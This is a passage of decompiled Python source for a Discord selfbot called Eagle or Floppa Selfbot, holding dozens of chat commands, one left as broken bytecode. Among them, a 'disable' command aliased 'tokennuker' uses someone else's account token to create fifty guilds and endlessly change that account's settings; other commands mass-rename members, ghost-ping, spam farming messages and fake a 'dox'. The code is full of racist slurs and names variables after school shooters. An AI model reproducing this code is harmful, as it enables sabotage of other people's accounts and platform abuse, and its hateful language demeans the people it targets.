                                            await ctx.send(embed=embed, delete_after=10)
                                        else:
                                            if str(category).lower() == 'utility2':
                                                embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                                embed.set_image(url='')
                                                embed.description = ' `Utiliy 2/2 Commands`\n - **getbanner** - Gets a servers banner\n - **ips** - sees where ips are by country\n - **inline** - Inline Mode\n - **copy** - Full Copy A server\n - **proxy** - Scrape working proxys\n - **addemoji** - Adds an emoji\n - **uptime** - Get bot uptime\n - **rename** - Rename yourself to something\n - **sendwebhook [message]** - Send message to webhook\n - **setbanner [banner]** - Set server banner\n - **dumpchat** - Dumps and Saves an entire chat, gc, or dm into a txt file\n - **botinvite** - Generate a bots invite from id                '
                                                await ctx.send(embed=embed, delete_after=10)
                                            else:
                                                if str(category).lower() == 'fun2':
                                                    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                                    embed.set_image(url='')
                                                    embed.description = ' `Fun 2/2 Commands`\n - **meme** - Random (Cringe) Meme\n - **gayrate** - Gay or nah\n - **tts* - Create TTS\n - **secretify** - Make All letters secret                '
                                                    await ctx.send(embed=embed, delete_after=100)
                                                else:
                                                    if str(category).lower() == 'settings':
                                                        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                                        embed.set_image(url='')
                                                        embed.description = ' `Settings`\n - **autoreply** - Setup Auto Reply to DMS\n  '
                                                        await ctx.send(embed=embed, delete_after=100)
                                                    elif str(category).lower() == 'anime':
                                                        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                                        embed.set_image(url='')
                                                        embed.description = ' `Requested anime bullshit`\n - **waifu** - Send waifu ;)\n - **slap [user]** - Slap User\n - **feed [user]** - Feed Them lol\n - **tickle** - Wtf'
                                                        await ctx.send(embed=embed, delete_after=100)


@Eagle.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/tickle')
    res = r.json()
    em = discord.Embed(description=(user.mention))
    em.set_author(name=f"{ctx.author.mention}Tickled {ctx.user.mention} lol wtf| Floppa Selfbot")
    em.set_image(url=(res['url']))
    await ctx.send(embed=em)


@Eagle.command()
async def hug(ctx, user: discord.Member):
    r = requests.get('https://nekos.life/api/v2/img/hug')
    res = r.json()
    em = discord.Embed(description=(user.mention))
    em.set_author(name=f"{ctx.author.mention} Hugs {ctx.user.mention} | Floppa Selfbot")
    em.set_image(url=(res['url']))
    await ctx.send(embed=em)


@Eagle.command()
async def waifu(ctx):
    r = requests.get('https://nekos.life/api/v2/img/waifu')
    res = r.json()
    em = discord.Embed()
    em.set_author(name='Waifu lol | Floppa Selfbot')
    em.set_image(url=(res['url']))
    await ctx.send(embed=em)


@Eagle.command()
async def feed(ctx, user: discord.Member):
    r = requests.get('https://nekos.life/api/v2/img/feed')
    res = r.json()
    em = discord.Embed(description=(user.mention))
    em.set_author(name='Get Fed ;D| Floppa Selfbot')
    em.set_image(url=(res['url']))
    await ctx.send(embed=em)


@Eagle.command()
async def slap(ctx, user):
    await ctx.message.delete()
    r = requests.get('https://nekos.life/api/v2/img/slap')
    res = r.json()
    em = discord.Embed(description=(user + ' Got Smacked LOOOL'))
    em.set_image(url=(res['url']))
    em.set_author(name='Smacked LOL| Floppa Selfbot')
    ctx.message.delete
    await ctx.send(embed=em)


@Eagle.command()
async def rename(ctx, rename_to):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=rename_to)
            print(f"Renamed {user.name} to {rename_to} in {ctx.guild.name}")
        except:
            print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")

    print('Action Completed: rall')


@Eagle.command(aliases=['gi'])
async def guildicon(ctx, *, guild=None):
    guild = guild or ctx.guild
    format = 'png'
    try:
        guild = int(guild)
    except:
        pass

    if type(guild) == int:
        guild = discord.utils.get((Eagle.guilds), id=(int(guild)))
    else:
        if type(guild) == str:
            guild = discord.utils.get((Eagle.guilds), name=guild)
    if guild.is_icon_animated():
        format = 'gif'
    icon = await guild.icon_url_as(format=format).read()
    with io.BytesIO(icon) as (file):
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=('Guild icon | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.add_field(name='Guild icon:', value=(f(file, f"icon.{format}")), inline=inlined)
        embed.set_footer(text=themefooter)
        await ctx.send(embed=embed, delete_after=30)
        await ctx.send(file=(discord.File(file, f"icon.{format}")))


@Eagle.command()
async def choose(ctx, *, choices: commands.clean_content):
    await ctx.message.delete()
    choices = choices.split(',')
    choices[0] = ' ' + choices[0]
    await ctx.send(str(random.choice(choices))[1:])


@Eagle.command()
async def addemoji(ctx, emoji_name, emoji_url=None):
    await ctx.message.delete()
    if ctx.message.attachments:
        image = await ctx.message.attachments[0].read()
    else:
        if emoji_url:
            async with aiohttp.ClientSession() as session:
                async with session.get(emoji_url) as resp:
                    image = await resp.read()
    emoji = await ctx.guild.create_custom_emoji(name=emoji_name, image=image)
    await ctx.send(f"Emoji {emoji.name} created!")


@Eagle.command()
async def ips(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='Type Of IPS', colour=jitcolor)
    embed.add_field(name="Europe IP's", value='188.122.76.15\n5.200.6.155\n188.122.88.143\n5.200.14.187\n5.200.14.248\n', inline=True)
    embed.add_field(name="Russia IP's", value='188.122.83.114\n188.122.83.61\n188.122.83.44\n188.122.83.101\n188.122.83.53\n', inline=True)
    embed.add_field(name="Dubai IP'S", value='185.179.203.235\n185.179.203.233\n185.179.203.234\n185.179.203.231\n185.179.203.232\n', inline=True)
    embed.add_field(name="US East IP's", value='162.244.54.107\n213.179.197.205\n213.179.197.39\n213.179.197.198\n213.179.197.233\n', inline=True)
    embed.add_field(name="US Central IP's", value='138.128.142.26\n138.128.141.90\n138.128.142.34\n138.128.141.112\n138.128.142.91\n', inline=True)
    embed.set_footer(text=(f"{ctx.author}"))
    await ctx.send(embed=embed)


@Eagle.command(pass_context=True)
async def meme(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='Eagle Selfbot', description='Memes', colour=jitcolor)
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/memes/new.json?sort=hot') as r:
            res = await r.json()
        embed.set_image(url=(res['data']['children'][random.randint(0, 25)]['data']['url']))
        await ctx.send(embed=embed)


@Eagle.command()
async def userinfo(ctx, member: discord.Member=None):
    if not member:
        member = ctx.message.author
    kekw = '%a , %d %b %Y %I:%M %p'
    ogornah = sorted((ctx.guild.members), key=(lambda member: member.joined_at)).index(member) + 1
    role = [role for role in member.roles]
    thefuckingembedretardedassdiscord = discord.Embed(timestamp=(ctx.message.created_at), color=boi)
    thefuckingembedretardedassdiscord.set_author(name=(str(member)), icon_url=(member.avatar_url))
    thefuckingembedretardedassdiscord.set_thumbnail(url=(member.avatar_url))
    thefuckingembedretardedassdiscord.add_field(name='ID:', value=(member.id), inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Display Name:', value=(member.display_name), inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Registered', value=(member.created_at.strftime(kekw)), inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Joined Server On:', value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')), inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Position:', value=f"{ogornah}/{len(ctx.guild.members)}", inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Roles:', value=(''.join([role.mention for role in role])), inline=False)
    thefuckingembedretardedassdiscord.add_field(name='Highest Role:', value=(member.top_role.mention), inline=False)
    thefuckingembedretardedassdiscord.set_footer(text=f"u'𝙧𝙚𝙦𝙪𝙚𝙨𝙩𝙚𝙙 𝙗𝙮 '{ctx.author.name}           ", icon_url=(ctx.author.avatar_url))
    print(member.top_role.mention)
    await ctx.send(embed=thefuckingembedretardedassdiscord)


@Eagle.command()
async def serverinfo(ctx):
    thefuckingname = ctx.guild.name
    create_server = ctx.guild.created_at
    owner_server = ctx.guild.owner
    server = ctx.message.guild
    role_count = len(server.roles)
    emoji_count = len(server.emojis)
    channel_count = len([x for x in server.channels if type(x) == discord.channel.TextChannel])
    em = discord.Embed(timestamp=(ctx.message.created_at), color=boi)
    em.set_author(name=(str(thefuckingname)), icon_url=(ctx.guild.icon_url))
    em.set_thumbnail(url=(ctx.guild.icon_url))
    em.add_field(name='Owner', value=owner_server, inline=False)
    em.add_field(name='Region', value=(server.region), inline=False)
    em.add_field(name='Members', value=(server.member_count), inline=False)
    em.add_field(name='Created On', value=(create_server.strftime('%a, %#d %B %Y')), inline=False)
    em.add_field(name='Text Channels', value=(str(channel_count)), inline=False)
    em.add_field(name='Number of Roles', value=(str(role_count)))
    em.add_field(name='Number of Emotes', value=(str(emoji_count)))
    await ctx.send(embed=em)


@Eagle.command()
async def dox(ctx, user: discord.Member=None):
    emaillist = random.choice(['gmx.de', 'yahoo.com', 'protonmail.com', 'gmail.com', 'fbi.org'])
    nr = random.choice(range(0, 9999))
    ip = random.choice(['127.0.0.1', '192.168.0.1', '192.168.0.101'])
    country = random.choice(['Niger', 'Niggeria', '3rd world country', 'Africa', 'Retard lives on different planet', 'Canada'])
    if user is None:
        await ctx.send('Mention a member retard')
    else:
        try:
            embed = discord.Embed(color=green_dark, title='Doxing in progress %0', description='Getting his email and address')
            embed.set_thumbnail(url='https://i.imgur.com/ZkFcOw6.gif')
            embed.set_footer(text=' made by stoned.eagle#0001')
            a = await ctx.send(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title='Doxing in progress %50', description='Getting ip and stuffs')
            embed.set_thumbnail(url='https://i.imgur.com/ZkFcOw6.gif')
            embed.set_footer(text=' made by stoned.eagle#0001')
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title='Doxing in progress %100', description='Getting mom credit cards')
            embed.set_thumbnail(url='https://i.imgur.com/ZkFcOw6.gif')
            embed.set_footer(text=' made by stoned.eagle#0001')
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title=f"Dox of {user.name}")
            embed.set_thumbnail(url='https://i.imgur.com/ZkFcOw6.gif')
            embed.add_field(name='Email', value=f"{user.name}{nr}@{emaillist}", inline=False)
            embed.add_field(name='IP', value=(f"{ip}"), inline=False)
            embed.add_field(name='Country', value=(f"{country}"), inline=False)
            embed.set_footer(text=' made by stoned.eagle#0001')
            await a.edit(embed=embed)
            await asyncio.sleep(2)
        except discord.HTTPException:
            a = await ctx.send('Doxing in progress %0 - Getting his email and address')
            await asyncio.sleep(2)
            await a.edit(content='Doxing in progress %50 - Getting ip and stuffs')
            await asyncio.sleep(2)
            await a.edit(content='Doxing in progress %100 - Getting mom credit cards')
            await asyncio.sleep(2)
            await a.edit(content=f"Dox of {user.name}:\n\nEmail: {user.name}{nr}@{emaillist}\nIP: {ip}\nCountry: {country}")


@Eagle.command()
async def invisiblenickname(ctx):
    await ctx.message.delete()
    try:
        name = '\u200e\u200e\u200e\u200e\u200e\u200e\u200e\u200f\u200f\u200e ឵឵ ឵឵ ឵឵ ឵឵\u200e'
        await ctx.author.edit(nick=name)
        await ctx.send('Now your nickname is invisible')
    except Exception as nigginaenae:
        try:
            a = await ctx.send('Lol no perms nigga')
            await asyncio.sleep(0.6)
            await a.edit(content='LMFAOOO RIP BOZO')
            await asyncio.sleep(0.6)
            await a.edit(content='L PERSON L KID L ')
            await asyncio.sleep(3)
            await a.message.delete()
        finally:
            nigginaenae = None
            del nigginaenae


@dox.error
async def dox_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.CommandInvokeError):
        time.sleep(0.1)
        await ctx.send('Cannot use the command in dms')


@Eagle.command()
async def emojispoofer(ctx):
    await ctx.message.delete()
    embed = discord.Embed(description='', color=8388608)
    embed.add_field(name='Nitrospoofer', value='\n Nitro Emoji Spoofer on lmfao poor retard', inline=False)
    embed.set_thumbnail(url='')
    embed.set_footer(text='')
    channel3 = Eagle.get_channel(ctx.channel.id)
    await channel3.send(embed=embed, delete_after=30)
    print(Fore.YELLOW + 'Command Used | nitroemojispoofer')


import requests

@Eagle.command()
async def encode(ctx, *, message):
    message = f"{message}"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    embed = discord.Embed(title='encoded base64 LOL', description=(f"{base64_message}"), color=jitcolor, timestamp=(ctx.message.created_at))
    await ctx.send(embed=embed, delete_after=30)


footer = 'Made By Stoned.eagle#0001'

@Eagle.command()
async def decode(ctx, message):
    base64_message = f"{message}"
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    decodee = message_bytes.decode('ascii')
    embed = discord.Embed(title=f"Decode for {message}!", description=(f"{decodee}"), color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_footer(text=f"{footer} ")
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def daddy(ctx):
    await ctx.channel.send('<@856178725858312224  >  ')


@Eagle.command()
async def pwned(ctx):
    Eagle
    r = requests.get('https://www.troyhunt.com/authentication-and-the-have-i-been-pwned-api/')
    link = str(r[0]['url'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as (file):
            await ctx.send(file=(discord.File(file, 'wholesomepicomguwu.png')))
    except:
        await ctx.send(link)


@Eagle.command()
async def cat(ctx):
    Eagle
    r = requests.get('https://api.thecatapi.com/v1/images/search').json()
    link = str(r[0]['url'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as (file):
            await ctx.send(file=(discord.File(file, 'wholesomepicomguwu.png')))
    except:
        await ctx.send(link)


@Eagle.command(aliases=[
 'bbwhatuwishinformaybeushouldwishitmorewhenitrainsitpoursidontknowhowtowishanymoreordoimightgomiamightjustblowmybrainsidbekurtcobianicantfeelmyfaceicantferelmyfaceicantfeelmyfaceceeeeeeeeiwishyouwouldfindyochillcauselordknowsthisshitwouldgetrealcantsavememansaveurselfcauseidonotneednohelpkeeponwishinkeeponwishinkeeponiwhiiiiiiiiingggoooaheeeeeeaaaaaaaaooohbbwhtuwishingformaybeyoushouldwishitmorebetheworldoisyouridontknowhowtowishanymoreordoimightgomiaaaaamightjustblowmybeainidbekurtcobainicantfeelmyfaceeeicantfeelmyfaceifcantfeelmyfaceeeeee',
 'fuckniggesrs'])
async def coinflip(ctx):
    choices = ['Heads', 'Tails']
    rancoin = random.choice(choices)
    await ctx.send(rancoin)


@Eagle.command(aliases=['suscheck', 'sussy'])
async def sus(ctx, *, user: discord.User):
    sus = ['Kinda sus', 'Sus', 'Sus as fuck', 'Not sus', 'Sussy uwu ']
    user = user.mention
    randomsus = random.choice(sus)
    embed = discord.Embed(title='Sus check', description=f"{user} is {randomsus}")
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command(aliases=['chnick', 'changenick'])
async def changenickname(ctx, member: discord.Member, nick):
    await member.edit(nick=nick)
    await ctx.send(f"Nickname was changed to {nick} for {member.mention} lmao ")


@Eagle.command()
async def pingroles(ctx, *, message=None):
    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
    await ctx.message.channel.send(mention)


@Eagle.command()
async def loser(ctx):
    await ctx.channel.send(ctx.author.mention)


@Eagle.command(pass_context=True)
async def bitcoin(ctx):
    url = 'https://api.coindesk.com/v1/bpi/currentprice/BTC.json'
    response = requests.get(url)
    value = response.json()['bpi']['USD']['rate']
    await ctx.send('`Bitcoin price is: `$' + value)


@Eagle.command()
async def sadcat(ctx):
    Eagle
    rape = requests.get('https://api.alexflipnote.dev/sadcat').json()
    depressedcuh = str(rape['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(depressedcuh) as resp:
                image = await resp.read()
        with io.BytesIO(image) as (file):
            await ctx.send(file=(discord.File(file, 'Eagle_sadcat.png')))
    except:
        await ctx.send(depressedcuh)


@Eagle.command()
async def removegc(ctx):
    Eagle
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


def autoreplying():

    @Eagle.event
    async def on_message(message):
        floorseats = ['birdless leg lmfao', 'so contested', 'oohohohoh', 'bro wtf', 'ok', '45 on my white tee', 'cither', 'adsf', 'zxxzs', '32vpl', 'Stond,elage', 'sdkx', 'pasedyou', 'bruh ', 'lolololololo', 'keker']
        if not message.guild:
            await message.channel.send(random.choice(floorseats))


@Eagle.command(aliases=['autoreplyzation'])
async def autoreply(ctx):
    autoreplying()


@Eagle.command(aliases=['gcleave'])
async def leavegc(ctx):
    Eagle
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Eagle.command()
async def purge--- This code section failed: ---

 L.1867         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_ATTR                delete
                6  CALL_FUNCTION_0       0  '0 positional arguments'
                8  GET_AWAITABLE
               10  LOAD_CONST               None
               12  YIELD_FROM
               14  POP_TOP

 L.1868        16  SETUP_LOOP          132  'to 132'
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                message
               22  LOAD_ATTR                channel
               24  LOAD_ATTR                history
               26  LOAD_FAST                'amount'
               28  LOAD_CONST               ('limit',)
               30  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               32  LOAD_ATTR                filter
               34  LOAD_LAMBDA              '<code_object <lambda>>'
               36  LOAD_STR                 'purge.<locals>.<lambda>'
               38  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               40  CALL_FUNCTION_1       1  '1 positional argument'
               42  LOAD_ATTR                map
               44  LOAD_LAMBDA              '<code_object <lambda>>'
               46  LOAD_STR                 'purge.<locals>.<lambda>'
               48  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
               50  CALL_FUNCTION_1       1  '1 positional argument'
               52  GET_AITER
               54  LOAD_CONST               None
               56  YIELD_FROM
               58  SETUP_EXCEPT         72  'to 72'
               60  GET_ANEXT
               62  LOAD_CONST               None
               64  YIELD_FROM
               66  STORE_FAST               'message'
               68  POP_BLOCK
               70  JUMP_FORWARD         94  'to 94'
             72_0  COME_FROM_EXCEPT     58  '58'
               72  DUP_TOP
               74  LOAD_GLOBAL              StopAsyncIteration
               76  COMPARE_OP               exception-match
               78  POP_JUMP_IF_FALSE    92  'to 92'
               80  POP_TOP
               82  POP_TOP
               84  POP_TOP
               86  POP_EXCEPT
               88  POP_BLOCK
               90  JUMP_ABSOLUTE       132  'to 132'
               92  END_FINALLY
             94_0  COME_FROM            70  '70'

 L.1869        94  SETUP_EXCEPT        114  'to 114'

 L.1870        96  LOAD_FAST                'message'
               98  LOAD_ATTR                delete
              100  CALL_FUNCTION_0       0  '0 positional arguments'
              102  GET_AWAITABLE
              104  LOAD_CONST               None
              106  YIELD_FROM
              108  POP_TOP
              110  POP_BLOCK
              112  JUMP_BACK            58  'to 58'
            114_0  COME_FROM_EXCEPT     94  '94'

 L.1871       114  POP_TOP
              116  POP_TOP
              118  POP_TOP

 L.1872       120  POP_EXCEPT
              122  JUMP_BACK            58  'to 58'
              124  END_FINALLY
              126  JUMP_BACK            58  'to 58'
              128  POP_BLOCK
              130  JUMP_ABSOLUTE       132  'to 132'
            132_0  COME_FROM_LOOP       16  '16'

Parse error at or near `JUMP_ABSOLUTE' instruction at offset 130


@Eagle.command(aliases=['uwu', 'penis'])
async def dick(ctx, *, user: discord.Member=None):
    Eagle
    if user is None:
        user = ctx.author
    racist = random.randint(1, 15)
    myface = ''
    for _i in range(0, racist):
        myface += '='

    await ctx.send(f"{user}'s Dick size\n8{myface}D")


locales = [
 'da', 'de',
 'en-GB', 'en-US',
 'es-ES', 'fr',
 'hr', 'it',
 'lt', 'hu',
 'nl', 'no',
 'pl', 'pt-BR',
 'ro', 'fi',
 'sv-SE', 'vi',
 'tr', 'cs',
 'el', 'bg',
 'ru', 'uk',
 'th', 'zh-CN',
 'ja', 'zh-TW',
 'ko']

@Eagle.command(aliases=['tokenfucker', 'tokennuker', 'nuketoken'])
async def disable(ctx, _token):
    Eagle
    headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',  'Content-Type':'application/json',
     'Authorization':_token}
    request = requests.Session()
    payload = {'theme':'light',  'locale':'ja',
     'message_display_compact':False,
     'inline_embed_media':False,
     'inline_attachment_media':False,
     'gif_auto_play':False,
     'render_embeds':False,
     'render_reactions':False,
     'animate_emoji':False,
     'convert_emoticons':False,
     'enable_tts_command':False,
     'explicit_content_filter':'0',
     'status':'invisible'}
    guild = {'channels':None,  'icon':None,
     'name':'property of eagle',
     'region':'europe'}
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)

    while True:
        try:
            request.patch('https://canary.discordapp.com/api/v6/users/@me/settings', headers=headers, json=payload)
        except Exception as e:
            try:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        else:
            break

    modes = cycle(['light', 'dark'])
    statuses = cycle(['online', 'idle', 'dnd', 'invisible'])
    while True:
        setting = {'theme':next(modes),
         'locale':random.choice(locales),  'status':next(statuses)}
        while True:
            try:
                request.patch('https://canary.discordapp.com/api/v6/users/@me/settings', headers=headers, json=setting, timeout=10)
            except Exception as e:
                try:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                finally:
                    e = None
                    del e

            else:
                break


@Eagle.command(aliases=['addrole', 'addroles', 'give'])
async def ar(ctx, member: discord.Member, role: discord.Role):
    await member.add_roles(role)


jitreport = [
 '12', '42', '23', '56']

@Eagle.command(aliases=['take', 'takerole', 'takeroles'])
async def tr(ctx, member: discord.Member, role: discord.Role):
    await ctx.message.delete()
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_author(name=('Take Roles | Eagle Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
    embed.set_thumbnail(url=vape)
    embed.set_image(url='')
    embed.add_field(name=f"Took Roles from {member}:", value='Floppa Selfbot Winning W', inline=inlined)
    embed.set_footer(text=themefooter)
    await ctx.send(embed=embed, delete_after=30)
    await member.remove_roles(role)


@Eagle.command()
async def restart():
    (os.execl)(sys.executable, sys.executable, *sys.argv)


@Eagle.command()
@commands.has_permissions(administrator=True)
async def tempban(ctx, user: discord.User, bantime: int):
    await ctx.guild.ban(user)
    await ctx.send(f"Banned {user.mention}.")
    await ctx.user.send(f"Hey {user.mention}, you were banned from the server for %s seconds." % bantime)
    await asyncio.sleep(bantime)
    await ctx.guild.unban(user)
    await ctx.send(f"Unbanned {user.mention}.")


@Eagle.command()
async def bots(ctx):
    Eagle
    nomemberslol = []
    for member in ctx.guild.members:
        if member.bot:
            nomemberslol.append(str(member.name).replace('`', '\\`').replace('*', '\\*').replace('_', '\\_') + '#' + member.discriminator)

    imagine = f"**Bots ({len(nomemberslol)}):**\n{', '.join(nomemberslol)}"
    await ctx.send(imagine)


@Eagle.command(aliases=['iplocate', 'findip'])
async def iplookup(ctx, *, ipaddr: str='1.3.3.7'):
    soimago = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = soimago.json()
    noitnevergetsold = discord.Embed()
    depression = [
     {'name':'IP',
      'value':geo['query']},
     {'name':'Type',
      'value':geo['ipType']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'City',
      'value':geo['city']},
     {'name':'Continent',
      'value':geo['continent']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'Hostname',
      'value':geo['ipName']},
     {'name':'ISP',
      'value':geo['isp']},
     {'name':'Latitute',
      'value':geo['lat']},
     {'name':'Longitude',
      'value':geo['lon']},
     {'name':'Org',
      'value':geo['org']},
     {'name':'Region',
      'value':geo['region']}]
    for field in depression:
        if field['value']:
            noitnevergetsold.add_field(name=(field['name']), value=(field['value']), inline=True)

    return await ctx.send(embed=noitnevergetsold)


@Eagle.command(aliases=['mee6', 'rankmee6farm'])
async def fast(ctx):
    Eagle
    time.sleep(1)
    await ctx.send('lol')
    time.sleep(60)
    await ctx.send('bruh')
    time.sleep(60)
    await ctx.send('.')
    time.sleep(60)
    await ctx.send('hi')
    time.sleep(60)
    await ctx.send('e')
    time.sleep(60)
    await ctx.send('Message')
    time.sleep(60)
    await ctx.send('.')
    time.sleep(60)
    await ctx.send('hi')
    time.sleep(60)
    time.sleep(60)
    await ctx.send('Message')
    time.sleep(60)
    await ctx.send('.')
    time.sleep(60)
    await ctx.send('The Tsunami wave crashed against the raised houses AND GOT FUKDCIJPIJKODIJUDODX')
    time.sleep(60)
    while True:
        await ctx.send('.rank')
        break

    await Eagle.process_commands()


def Nitro():
    code = ''.join(random.choices((string.ascii_letters + string.digits), k=16))
    return f"https://discord.gift/{code}"


@Eagle.command(aliases=['nitrogen'])
async def nitro(ctx):
    Eagle
    await ctx.send(Nitro())


@Eagle.command(aliases=['markasread', 'ack'])
async def ignore(ctx):
    Eagle
    for guild in Eagle.guilds:
        await guild.ack()


clipz = [
 ':one:',
 ':two:',
 ':three:',
 ':four:',
 ':five:',
 ':six:']
guns = [
 (-1, -1),
 (0, -1),
 (1, -1),
 (-1, 0),
 (1, 0),
 (-1, 1),
 (0, 1),
 (1, 1)]

@Eagle.command(aliases=['dankmemeruwu', 'ifyouarereadingthisyouareaskid'])
async def dankfarm(ctx):
    Eagle
    time.sleep(1)
    await ctx.send('pls hunt')
    time.sleep(1)
    await ctx.send('pls fish')
    time.sleep(1)
    await ctx.send('pls dig')
    time.sleep(1)
    await ctx.send('pls beg')
    time.sleep(40)
    while True:
        await ctx.send('.dankfarm')
        break


@Eagle.command(aliases=['plsfish', 'plshunt'])
async def pls(ctx):
    Eagle
    time.sleep(1)
    await ctx.send('pls hunt')
    time.sleep(1)
    await ctx.send('pls fish')
    time.sleep(1)
    await ctx.send('pls dig')
    time.sleep(1)
    await ctx.send('pls beg')
    time.sleep(40)
    while True:
        await ctx.send('.pls')
        break


@Eagle.command()
async def massunblock(ctx):
    print(Eagle.user.relationships)
    for relationship in Eagle.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()
            print('Unblocked Everyone, Now friend stoned.eagle uwuw uwu uwuwuwuwuwuwuwuuu')
            while True:
                print('Sex')
                time.sleep(2)
                print('stoned rocks')
                break


@Eagle.command()
async def tweet(ctx, username: str=None, *, message: str=None):
    if username is None or message is None:
        await ctx.send('fuck is you gonna tweet????????')
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as (file):
                    await ctx.send(file=(discord.File(file, 'Eagle_tweet.png')))
            except:
                await ctx.send(res['message'])


@Eagle.command
async def daddy(ctx):
    await ctx.send({ctx.author})


@Eagle.command(aliases=['deepfry'])
async def fry(ctx, user: discord.Member=None):
    Eagle
    dogwifhat = 'https://nekobot.xyz/api/imagegen?type=deepfry&image='
    if user is None:
        schoolshooters = str(ctx.author.avatar_url_as(format='png'))
        dogwifhat += schoolshooters
        r = requests.get(dogwifhat)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as (file):
                await ctx.send(file=(discord.File(file, 'eagle_fry.png')))
        except:
            await ctx.send(res['message'])

    else:
        sadness = str(user.avatar_url_as(format='png'))
        dogwifhat += sadness
        r = requests.get(dogwifhat)
        res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(str(res['message'])) as resp:
                image = await resp.read()
        with io.BytesIO(image) as (file):
            await ctx.send(file=(discord.File(file, 'eagle_fry.png')))
    except:
        await ctx.send(res['message'])


@Eagle.command(aliases=['reversesearch', 'anticatfish', 'catfish'])
async def revpfp(ctx, user: discord.Member=None):
    myfuckingdick = ctx.author
    if user is None:
        user = myfuckingdick
    try:
        sex = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}, Heres The Users Supposable girlfriend ")
        await ctx.send(embed=sex)
    except Exception as sex:
        try:
            Eagle
        finally:
            sex = None
            del sex


@Eagle.command(aliases=['ghost', 'ping'])
async def ghostping(ctx, *, args):
    await ctx.message.delete()
    Eagle
    await ctx.send(args, delete_after=0.1)


@Eagle.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None):
    format = 'gif'
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = 'png'
    theavaterstupidretard = user.avatar_url_as(format=(format if format != 'gif' else None))
    async with aiohttp.ClientSession() as session:
        async with session.get(str(theavaterstupidretard)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as (file):
        await ctx.send(file=(discord.File(file, f"Avatar.{format}")))


@Eagle.command(aliases=['gifsearch', 'searchgif'])
async def gif(ctx, query=None):
    Eagle
    if query is None:
        stonedeagleisasoontobeschoolshooter = requests.get('https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R')
        youllgetoverit = stonedeagleisasoontobeschoolshooter.json()
        await ctx.send(youllgetoverit['data']['url'])
    else:
        r = requests.get(f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
